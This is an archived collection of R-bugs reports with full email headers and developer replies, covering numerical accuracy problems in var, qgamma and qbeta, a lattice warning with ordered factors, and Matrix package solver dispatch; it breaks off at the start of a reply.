=================================================
This is an automated collection of open reports in
the R-bugs repository.
=================================================

Directory:  Accuracy

* PR# 1228 *
Subject: bug with var(rep(1e30, 3))
From: Emmanuel Paradis <paradis@isem.univ-montp2.fr>
Date: Wed, 26 Dec 2001 13:03:31 +0100
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1228 <==
From postmaster@franz.stat.wisc.edu  Wed Dec 26 13:07:55 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id NAA13232
	for <r-bugs@biostat.ku.dk>; Wed, 26 Dec 2001 13:07:55 +0100 (MET)
Received: from isem.isem.univ-montp2.fr (really [162.38.183.200]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m16JCqF-000IZvC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Wed, 26 Dec 2001 06:07:27 -0600 (CST) 
Received: from diversi (diversi.isem.univ-montp2.fr [162.38.183.45])
	by isem.isem.univ-montp2.fr (8.9.1b+Sun/8.9.1) with SMTP id MAA19343
	for <r-bugs@r-project.org>; Wed, 26 Dec 2001 12:58:33 +0100 (MET)
Message-Id: <3.0.32.20011226130330.00910b80@162.38.183.200>
X-Sender: paradis@162.38.183.200
X-Mailer: Windows Eudora Pro Version 3.0 (32)
Date: Wed, 26 Dec 2001 13:03:31 +0100
To: r-bugs@r-project.org
From: Emmanuel Paradis <paradis@isem.univ-montp2.fr>
Subject: bug with var(rep(1e30, 3))
Mime-Version: 1.0
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id NAA13232

There seems to be a bug with var() when the argument is a vector with
exactly three values of 1e30 (or close to this value). This does not happen
with twice, four (or more) times this value, or another value.


> var(rep(1e30, 3))
[1] 2.971056e+28
> var(rep(1.2e30, 3))
[1] 2.971056e+28
> var(rep(0.9e30, 3))
[1] 2.971056e+28
> var(rep(0.8e30, 3))
[1] 0
> var(rep(1e29, 3))
[1] 0
> var(rep(1e30, 2))
[1] 0
> var(rep(1e30, 4))
[1] 0
> var(rep(1e31, 3))
[1] 0


The bug is repeatable, and I got the same results with R 1.3.1 (binary from
CRAN) and R 1.4.0 (binary from BD Ripley's site) both on Windows NT, and R
1.4.0 on Solaris (compiled from sources).



Emmanuel Paradis
Laboratoire de Paléontologie
Institut des Sciences de l'Évolution
Université Montpellier II
F-34095 Montpellier cédex 05
France
   phone: +33  4 67 14 39 64
     fax: +33  4 67 14 36 10
  mailto:paradis@isem.univ-montp2.fr

==> 1228.reply.1 <==
From p.dalgaard@biostat.ku.dk  Wed Dec 26 15:32:38 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA13516;
	Wed, 26 Dec 2001 15:32:38 +0100 (MET)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id fBQEVRP24017;
	Wed, 26 Dec 2001 15:31:27 +0100
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: paradis@isem.univ-montp2.fr
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] bug with var(rep(1e30, 3)) (PR#1228)
References: <200112261207.NAA13242@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 26 Dec 2001 15:31:27 +0100
In-Reply-To: <200112261207.NAA13242@pubhealth.ku.dk>
Message-ID: <x2heqet5mo.fsf@blueberry.kubism.ku.dk>
Lines: 56
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

paradis@isem.univ-montp2.fr writes:

> There seems to be a bug with var() when the argument is a vector with
> exactly three values of 1e30 (or close to this value). This does not happen
> with twice, four (or more) times this value, or another value.
> 
> 
> > var(rep(1e30, 3))
> [1] 2.971056e+28
> > var(rep(1.2e30, 3))
> [1] 2.971056e+28
> > var(rep(0.9e30, 3))
> [1] 2.971056e+28
> > var(rep(0.8e30, 3))
> [1] 0
> > var(rep(1e29, 3))
> [1] 0
> > var(rep(1e30, 2))
> [1] 0
> > var(rep(1e30, 4))
> [1] 0
> > var(rep(1e31, 3))
> [1] 0
> 
> 
> The bug is repeatable, and I got the same results with R 1.3.1 (binary from
> CRAN) and R 1.4.0 (binary from BD Ripley's site) both on Windows NT, and R
> 1.4.0 on Solaris (compiled from sources).

Not a bug, roundoff:

> (1e30+1e30+1e30)/3-1e30
[1] 1.407375e+14
> 3*((1e30+1e30+1e30)/3-1e30)^2/2
[1] 2.971056e+28

Relative errors of the order 1e-16 are completely expectable in
floating point arithmetic.

For illustration, look at it in octal, after removing a bunch of
trailing zeroes:

> x<-1e30/(8^16)
> structure(x, class="octmode")
[1] "144762623464043165"
> structure(x+x+x, class="octmode")
[1] "456730272634151540"

If you look carefully, you will see that a bit is lost in the process
since 5+5+5 is 17 octal.

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1228.followup.1 <==
From ripley@stats.ox.ac.uk  Wed Dec 26 16:52:52 2001
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA13677;
	Wed, 26 Dec 2001 16:52:51 +0100 (MET)
Received: from gannet.stats (IDENT:root@gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id PAA29226;
	Wed, 26 Dec 2001 15:52:25 GMT
Received: from localhost (ripley@localhost)
	by gannet.stats (8.11.3/8.11.3) with ESMTP id fBQFqPg12750;
	Wed, 26 Dec 2001 15:52:25 GMT
X-Authentication-Warning: gannet.stats: ripley owned process doing -bs
Date: Wed, 26 Dec 2001 15:52:25 +0000 (GMT)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender:  <ripley@gannet.stats>
To: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
cc: <paradis@isem.univ-montp2.fr>, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] bug with var(rep(1e30, 3)) (PR#1228)
In-Reply-To: <x2heqet5mo.fsf@blueberry.kubism.ku.dk>
Message-ID: <Pine.LNX.4.31.0112261550130.12728-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

But there are better algorithms that are not subject to this sort
of rounding error.

I reckon that computing a variance this way is not the quality of
algorithm one should expect from R.

On 26 Dec 2001, Peter Dalgaard BSA wrote:

> paradis@isem.univ-montp2.fr writes:
>
> > There seems to be a bug with var() when the argument is a vector with
> > exactly three values of 1e30 (or close to this value). This does not happen
> > with twice, four (or more) times this value, or another value.
> >
> >
> > > var(rep(1e30, 3))
> > [1] 2.971056e+28
> > > var(rep(1.2e30, 3))
> > [1] 2.971056e+28
> > > var(rep(0.9e30, 3))
> > [1] 2.971056e+28
> > > var(rep(0.8e30, 3))
> > [1] 0
> > > var(rep(1e29, 3))
> > [1] 0
> > > var(rep(1e30, 2))
> > [1] 0
> > > var(rep(1e30, 4))
> > [1] 0
> > > var(rep(1e31, 3))
> > [1] 0
> >
> >
> > The bug is repeatable, and I got the same results with R 1.3.1 (binary from
> > CRAN) and R 1.4.0 (binary from BD Ripley's site) both on Windows NT, and R
> > 1.4.0 on Solaris (compiled from sources).
>
> Not a bug, roundoff:
>
> > (1e30+1e30+1e30)/3-1e30
> [1] 1.407375e+14
> > 3*((1e30+1e30+1e30)/3-1e30)^2/2
> [1] 2.971056e+28
>
> Relative errors of the order 1e-16 are completely expectable in
> floating point arithmetic.
>
> For illustration, look at it in octal, after removing a bunch of
> trailing zeroes:
>
> > x<-1e30/(8^16)
> > structure(x, class="octmode")
> [1] "144762623464043165"
> > structure(x+x+x, class="octmode")
> [1] "456730272634151540"
>
> If you look carefully, you will see that a bit is lost in the process
> since 5+5+5 is 17 octal.
>
> --
>    O__  ---- Peter Dalgaard             Blegdamsvej 3
>   c/ /'_ --- Dept. of Biostatistics     2200 Cph. N
>  (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
> ~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1228.reply.2 <==
From p.dalgaard@biostat.ku.dk  Wed Dec 26 18:01:10 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA13867;
	Wed, 26 Dec 2001 18:01:10 +0100 (MET)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id fBQGxxE24151;
	Wed, 26 Dec 2001 17:59:59 +0100
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: Prof Brian Ripley <ripley@stats.ox.ac.uk>
Cc: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>,
        <paradis@isem.univ-montp2.fr>, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] bug with var(rep(1e30, 3)) (PR#1228)
References: <Pine.LNX.4.31.0112261550130.12728-100000@gannet.stats>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 26 Dec 2001 17:59:59 +0100
In-Reply-To: <Pine.LNX.4.31.0112261550130.12728-100000@gannet.stats>
Message-ID: <x2vgetrk6o.fsf@blueberry.kubism.ku.dk>
Lines: 33
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

Prof Brian Ripley <ripley@stats.ox.ac.uk> writes:

> But there are better algorithms that are not subject to this sort
> of rounding error.
> 
> I reckon that computing a variance this way is not the quality of
> algorithm one should expect from R.

Hmm. Which algorithms are there? Surely almost any kind of provisional
means subtraction could avoid the the extreme case where the mean of a
bunch of identical numbers is different from all of them, but will it
also improve precision in the general case?

Essentially our current algorithm in cov.c is

xm<- sum(x)/n
v <- 1/(n-1)*sum((x-xm)^2)

> > > x<-1e30/(8^16)
> > > structure(x, class="octmode")
> > [1] "144762623464043165"
> > > structure(x+x+x, class="octmode")
> > [1] "456730272634151540"
> >
> > If you look carefully, you will see that a bit is lost in the process
> > since 5+5+5 is 17 octal.


-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1228.audit <==
Fri Dec 28 20:08:08 2001	thomas	moved from incoming to Accuracy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2214 *
Subject: qgamma precision
From: terra@diku.dk
Date: Fri, 25 Oct 2002 16:50:17 +0200 (MET DST)
--good idea; improvement has to work for both lower and upper tail probs.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2214 <==
From terra@diku.dk  Fri Oct 25 16:50:17 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA13654
	for <R-bugs@biostat.ku.dk>; Fri, 25 Oct 2002 16:50:17 +0200 (MET DST)
Date: Fri, 25 Oct 2002 16:50:17 +0200 (MET DST)
From: terra@diku.dk
Message-Id: <200210251450.QAA13654@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: qgamma precision

Full_Name: Morten Welinder
Version: 1.5.1
OS: Solaris
Submission from: (NULL) (65.213.85.136)


I was having problems with qgamma's precision in the sense that
pgamma(qpgamma(x))
was not as close to the identity function as I would like.  I was seeing
relative
errors with random input of about 1e-8.  This fits nicely with the code'd EPS2
value of 5e-7.

To solve this I added a newton step at the end.  This seems far cheaper than
the
current iterations.  Here's the code I added (to replace the final return):


    /* Special Gnumeric patch to improve precision.  */
    {
	gnum_float x0 = 0.5*scale*ch;
	gnum_float e0 = pgamma (x0, alpha, scale, lower_tail, log_p) - p;

	if (e0 != 0 && lower_tail && !log_p) {
	    gnum_float d0 = dgamma (x0, alpha, scale, log_p);
	    if (d0) {
		gnum_float x1 = x0 - e0 / d0;
		gnum_float e1 = pgamma (x1, alpha, scale, lower_tail, log_p) - p;
		if (gnumabs (e1) < gnumabs (e0))
		    x0 = x1;
	    }
	}

	return x0;
    }

(Just read "gnum_float" as "double" and "gnumabs" as "fabs".)

The test for lower_tail is because (a) that is where I use it, and (b) the d0
calculation is probably wrong otherwise.

With this change, the relative precision improves to something like 1e-15.


==> 2214.audit <==
Sun Oct 27 08:33:47 2002	ripley	moved from incoming to Accuracy
Mon Jun 16 10:17:55 2003	maechler	changed notes
Mon Jun 16 10:17:55 2003	maechler	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2894 *
Subject: qbeta hang
From: terra@gnome.org
Date: Thu, 1 May 2003 22:43:59 +0200 (MET DST)
--R 1.7.1 incorporates the two suggestions of the 2nd followup:
--  r = sqrt(-2 * log (a)) and ...(log1p(-a) + log (qq))...
--
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2894 <==
From terra@gnome.org Thu May  1 22:44:00 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h41Khx2b017785
	for <R-bugs@biostat.ku.dk>; Thu, 1 May 2003 22:43:59 +0200 (MET DST)
Date: Thu, 1 May 2003 22:43:59 +0200 (MET DST)
Message-Id: <200305012043.h41Khx2b017785@pubhealth.ku.dk>
From: terra@gnome.org
To: R-bugs@biostat.ku.dk
Subject: qbeta hang

Full_Name: Morten Welinder
Version: 1.6.1
OS: Solaris/sparc
Submission from: (NULL) (65.213.85.144)


qbeta(0.1, 1e-8, 0.5, TRUE, FALSE) seems to hang for me.


==> 2894.reply.1 <==
From p.dalgaard@biostat.ku.dk Fri May  2 00:16:13 2003
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h41MGD2b018113;
	Fri, 2 May 2003 00:16:13 +0200 (MET DST)
Received: from blueberry.kubism.ku.dk (localhost.localdomain [127.0.0.1])
	by blueberry.kubism.ku.dk (8.12.8/8.12.8) with ESMTP id h41MK78e014746;
	Fri, 2 May 2003 00:20:07 +0200
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.12.8/8.12.8/Submit) id h41MK6Ja014742;
	Fri, 2 May 2003 00:20:06 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: terra@gnome.org
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] qbeta hang (PR#2894)
References: <200305012044.h41Ki02b017789@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 02 May 2003 00:20:06 +0200
In-Reply-To: <200305012044.h41Ki02b017789@pubhealth.ku.dk>
Message-ID: <x265oujomh.fsf@biostat.ku.dk>
Lines: 45
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

terra@gnome.org writes:

> Full_Name: Morten Welinder
> Version: 1.6.1
> OS: Solaris/sparc
> Submission from: (NULL) (65.213.85.144)
> 
> 
> qbeta(0.1, 1e-8, 0.5, TRUE, FALSE) seems to hang for me.

confirmed on 1.7.0 Solaris 9, gcc 3.0.3 (standard build, so -O2, I assume)

Morten: the gcc version is often crucial in these cases.

However, the exact same thing is happening on Linux. The immediate
cause is that n = fmax2(lneps/log(y), 4.0) gets large when y is in the
vicinity of 1-1e-8, so the loop in src/nmath/pbeta.c:101 gets a rather
high count. The algorithm isn't really stuck, it just takes a very
long time. On the fastest machine that I have available:

> system.time(qbeta(0.1, 1e-8, 0.5, TRUE, FALSE))
[1] 75.58  0.00 75.58  0.00  0.00


It's not really that surprising:

> pbeta(1e-5, 1e-8, 0.5,, TRUE, FALSE)
[1] 0.9999999
> pbeta(1e-10, 1e-8, 0.5,, TRUE, FALSE)
[1] 0.9999998
> pbeta(1e-200, 1e-8, 0.5,, TRUE, FALSE)
[1] 0.9999954
> pbeta(1e-309, 1e-8, 0.5,, TRUE, FALSE)
[1] 0.999993
> pbeta(1e-400, 1e-8, 0.5,, TRUE, FALSE)
[1] 0

and you're trying to solve pbeta(x, 1e-8, 0.5,, TRUE, FALSE) == 0.1


-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 2894.followup.1 <==
From dmurdoch@pair.com Fri May  2 00:38:53 2003
Received: from tomts13-srv.bellnexxia.net (tomts13.bellnexxia.net [209.226.175.34])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h41Mcp2b018208
	for <R-bugs@biostat.ku.dk>; Fri, 2 May 2003 00:38:52 +0200 (MET DST)
Received: from djmfuj ([65.93.70.143]) by tomts13-srv.bellnexxia.net
          (InterMail vM.5.01.04.19 201-253-122-122-119-20020516) with SMTP
          id <20030501223850.JWNE22698.tomts13-srv.bellnexxia.net@djmfuj>;
          Thu, 1 May 2003 18:38:50 -0400
From: Duncan Murdoch <dmurdoch@pair.com>
To: terra@gnome.org
Cc: R-bugs@biostat.ku.dk
Subject: Re: [Rd] qbeta hang (PR#2894)
Date: Thu, 01 May 2003 18:38:49 -0400
Message-ID: <c783bv43uq0raa1km9a7qqs0ri7pjmo1gu@4ax.com>
References: <200305012044.h41Ki02b017789@pubhealth.ku.dk>
In-Reply-To: <200305012044.h41Ki02b017789@pubhealth.ku.dk>
X-Mailer: Forte Agent 1.91/32.564
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

On Thu, 1 May 2003 22:44:00 +0200 (MET DST), you wrote:

>Full_Name: Morten Welinder
>Version: 1.6.1
>OS: Solaris/sparc
>Submission from: (NULL) (65.213.85.144)
>
>
>qbeta(0.1, 1e-8, 0.5, TRUE, FALSE) seems to hang for me.

In 1.7.0-patched in Windows, it's very, very slow, but eventually
produces an answer:

> qbeta(0.1, 1e-8, 0.5, TRUE, FALSE)
[1] 4.400784e-309

The answer should be really small (the mean is 2e-8, and it's strongly
skewed to the right), so I'd guess it's giving the right answer, and
is just slow to converge to it.

Duncan Murdoch

==> 2894.followup.2 <==
From welinder@rentec.com Fri May  2 16:03:42 2003
Received: from ram.rentec.com (ram.rentec.com [192.5.35.66])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h42E3e2b026336;
	Fri, 2 May 2003 16:03:41 +0200 (MET DST)
Received: from robbie.rentec.com (robbie.rentec.com [192.5.35.99])
	by ram.rentec.com (8.12.1/8.12.1) with ESMTP id h42E3OR5024597;
	Fri, 2 May 2003 10:03:24 -0400 (EDT)
Received: (from welinder@localhost)
	by robbie.rentec.com (8.12.5+Sun/8.12.5/Submit) id h42E3NcU001790;
	Fri, 2 May 2003 10:03:23 -0400 (EDT)
Date: Fri, 2 May 2003 10:03:23 -0400 (EDT)
Message-Id: <200305021403.h42E3NcU001790@robbie.rentec.com>
From: Morten Welinder <welinder@rentec.com>
To: p.dalgaard@biostat.ku.dk
CC: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
In-reply-to: <x265oujomh.fsf@biostat.ku.dk> (message from Peter Dalgaard BSA
	on 02 May 2003 00:20:06 +0200)
Subject: Re: [Rd] qbeta hang (PR#2894)
References: <200305012044.h41Ki02b017789@pubhealth.ku.dk> <x265oujomh.fsf@biostat.ku.dk>


Ok, I can confirm that it does not, in fact, loop forever.  Just a close
approximation.

> Morten: the gcc version is often crucial in these cases.

Sorry.  gcc-2.7.2 (both -O2 and -O0) on Solaris 2.9 / sparc.

The problems seem to be...

1. The initial guess underflows to zero.

2. That guess is replaced by the truly awful guess 0.5.

3. The root finding algorithm ignores all the nice properties of pbeta
   -- such as it being monotonically increasing and bounded.

> and you're trying to solve pbeta(x, 1e-8, 0.5,, TRUE, FALSE) == 0.1

Not quite.  What I was trying to do was the see what would happen with an
insanely small alpha.  Actually doing that would involve getting the
arguments right, of course, :-)  The not-quite-hang was an unplesant side
effect of swapping the args.

I notice things like

    r = sqrt(-log(a * a));

in the code.  I fail to see why that isn't just

    r = sqrt(-2 * log (a))

which ought to be faster and more accurate.  Then later

    ...log((1. - a) * qq)...

which might be better as

    ...(log1p(-a) + log (qq))...

if a is close to zero.

There are lots of other places that worry me with respect to cancellation
errors, for example

    r = 1 - pp;
    t = 1 - qq;

Morten

==> 2894.audit <==
Thu May 22 23:01:16 2003	thomas	moved from incoming to Accuracy
Mon Jun 16 11:24:33 2003	maechler	changed notes
Mon Jun 16 11:24:33 2003	maechler	foobar
Mon Jun 16 11:24:56 2003	maechler	changed notes
Mon Jun 16 11:24:56 2003	maechler	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Add-ons

* PR# 974 *
Subject: Lattice: panel.superpose with ordered factor groups
From: John Maindonald <john.maindonald@anu.edu.au>
Date: Sat, 9 Jun 2001 11:08:51 +1000 (EST)
--The warning is standard S and R behaviour.
--Probably xyplot needs to avoid it (by unclassing?)
--Still there in lattice 0.3-0, 0.6-8
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 974 <==
From postmaster@franz.stat.wisc.edu  Sat Jun  9 03:09:10 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id DAA20814
	for <r-bugs@biostat.ku.dk>; Sat, 9 Jun 2001 03:09:09 +0200 (MET DST)
Received: from leonard.anu.edu.au (really [150.203.2.15]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m158XFN-000JbdC@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for <r-bugs@r-project.org>; Fri, 8 Jun 2001 20:09:01 -0500 (CDT) 
Received: (from u9801539@localhost)
	by leonard.anu.edu.au (8.9.3/8.9.3) id LAA01081;
	Sat, 9 Jun 2001 11:08:51 +1000 (EST)
Date: Sat, 9 Jun 2001 11:08:51 +1000 (EST)
From: John Maindonald <john.maindonald@anu.edu.au>
Message-Id: <200106090108.LAA01081@leonard.anu.edu.au>
To: r-bugs@r-project.org
Subject: Lattice: panel.superpose with ordered factor groups
Cc: deepayan@stat.wisc.edu


#       r-bugs@r-project.org
The panel.superpose() function for xyplot() complains when 
the groups parameter is set to be an ordered factor.

> library(mass)
> data(cabbages)
> library(lattice)
> xyplot(HeadWt~VitC|Cult, panel=panel.superpose,
+   groups=Date, data=cabbages)
> cabbages$Date <- ordered(cabbages$Date)  # Make Date an ordered factor
> xyplot(HeadWt~VitC|Cult, panel=panel.superpose,
+   groups=Date, data=cabbages)
Warning messages: 
1: Incompatible methods ("Ops.ordered", "Ops.factor") for "==" 
2: Incompatible methods ("Ops.ordered", "Ops.factor") for "==" 
3: Incompatible methods ("Ops.ordered", "Ops.factor") for "==" 
4: Incompatible methods ("Ops.ordered", "Ops.factor") for "==" 
5: Incompatible methods ("Ops.ordered", "Ops.factor") for "==" 
6: Incompatible methods ("Ops.ordered", "Ops.factor") for "==" 

--please do not edit the information below--

Version:
 platform = i386-pc-mingw32
 arch = x86
 os = Win32
 system = x86, Win32
 status = 
 major = 1
 minor = 2.3
 year = 2001
 month = 04
 day = 26
 language = R

Windows ME 4.90 (build 3000)  

Search Path:
 .GlobalEnv, package:grid, package:lattice, package:mass, package:ctest, Autoloads, package:base
John Maindonald            email: john.maindonald@anu.edu.au        
phone : (6125)3998         fax   : (6125)5549 
Statistical Consulting Unit, Room 1194,
John Dedman Mathematical Sciences Building
(Centre for Mathematics & Its Applications.)

==> 974.audit <==
Sun Jun 17 09:39:36 2001	ripley	changed notes
Sun Jun 17 09:39:36 2001	ripley	foobar
Sun Jun 17 09:39:36 2001	ripley	moved from incoming to Add-ons
Sun Sep 30 15:13:56 2001	ripley	changed notes
Sun Sep 30 15:13:56 2001	ripley	foobar
Wed Jan  8 11:14:52 2003	ripley	changed notes
Wed Jan  8 11:14:52 2003	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1361 *
Subject: Matrix identification bug
From: hyu@stats.uwo.ca
Date: Tue, 5 Mar 2002 21:19:46 +0100 (MET)
--seems to be about Matrix package, not solve
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1361 <==
From hyu@stats.uwo.ca  Tue Mar  5 21:19:46 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA08030
	for <R-bugs@biostat.ku.dk>; Tue, 5 Mar 2002 21:19:46 +0100 (MET)
Date: Tue, 5 Mar 2002 21:19:46 +0100 (MET)
From: hyu@stats.uwo.ca
Message-Id: <200203052019.VAA08030@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Matrix identification bug

Full_Name: Hao Yu
Version: 1.4.1
OS: Windws and Linux
Submission from: (NULL) (129.100.45.161)


Hi,
   Recently we did some benchmarks regarding matrix inverse operation and found
some strange things. See the following results (the package Matrix is most
updated).

1. load the function Toeplitz and library(Matrix)
"Toeplitz"
function(x)
{
        matrix(x[1 + abs(outer(seq(along = x), seq(along = x), FUN = "-"))], 
                byrow = T, ncol = length(x))
}
2. On a PIII 1.125GHz (256kb cache)desktop PC with win2k, the results are
> system.time(solve(Toeplitz(.5^seq(0,999))))
[1] 38.25  0.22 42.01    NA    NA
> system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
[1] 28.01  0.17 30.94    NA    NA

On a PIII-M 1.2GHz (512kb cache) laptop PC with winxp pro, the results are
> system.time(solve(Toeplitz(.5^seq(0,999))))
[1] 33.94  0.25 34.01    NA    NA
> system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
[1] 9.40  0.13 9.54    NA    NA

On a PIII Xeon 1GHz (256kb cache) RedHat 7.2 Linux, the results are
> system.time(solve(Toeplitz(.5^seq(0,999))))
[1] 53.79  0.48 00.01    NA    NA
> system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
[1] 30.29  0.21 30.59    NA    NA

This was the first time that windows R outperformed linux R even PIII Xeon 1GHz
is slightly faster than PIII 1.125GHz. Notice the abnormal result 9.4s from
PIII-M 1.2GHz (cannot be three times faster). After using native fortran lapack
(call to dpotrf and dpotri returns 9s for PIII Xeon), I realized that R may
treat the matrix as a general matrix rather than symmetric except the abnormal
case.  To confirm this, I modified the R_LapackPP.cc in Matrix package and it
turned out that
    is.MMatrix() failed to return true.
Hence 
        if (checkClass(classes, "Hermitian")) 
            return new LaSymmMatDouble(x);
is not executed in static LaMatDouble* asLaMatrix(SEXP x). Instead
    if (isMatrix(x)) {
            return new LaGenMatDouble(x);  
        }
is used. 
After replaced
    return new LaGenMatDouble(x);   
with 
    return new LaSymmMatDouble(x);

the result was (PIII Xeon 1GHz RedHat 7.2 Linux))
> system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
[1] 9.76 0.22 9.97 0.00 0.00

Clearly there are some bugs in solve() and solve.Matrix(). Notice that all have
> is.Hermitian(Toeplitz(.5^seq(0,999)))
[1] TRUE


Thanks 
Hao Yu


==> 1361.followup.1 <==
From ripley@stats.ox.ac.uk  Tue Mar  5 22:32:30 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA08212
	for <R-bugs@biostat.ku.dk>; Tue, 5 Mar 2002 22:32:30 +0100 (MET)
Received: from tern.stats (pc2-oxfo4-0-cust120.oxf.cable.ntl.com [62.254.131.120])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id VAA24644;
	Tue, 5 Mar 2002 21:31:57 GMT
Date: Tue, 5 Mar 2002 21:32:31 +0000 (GMT Standard Time)
From: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
To: hyu@stats.uwo.ca
cc: R-bugs@biostat.ku.dk
Subject: Re: [Rd] Matrix identification bug (PR#1361)
In-Reply-To: <200203052019.VAA08035@pubhealth.ku.dk>
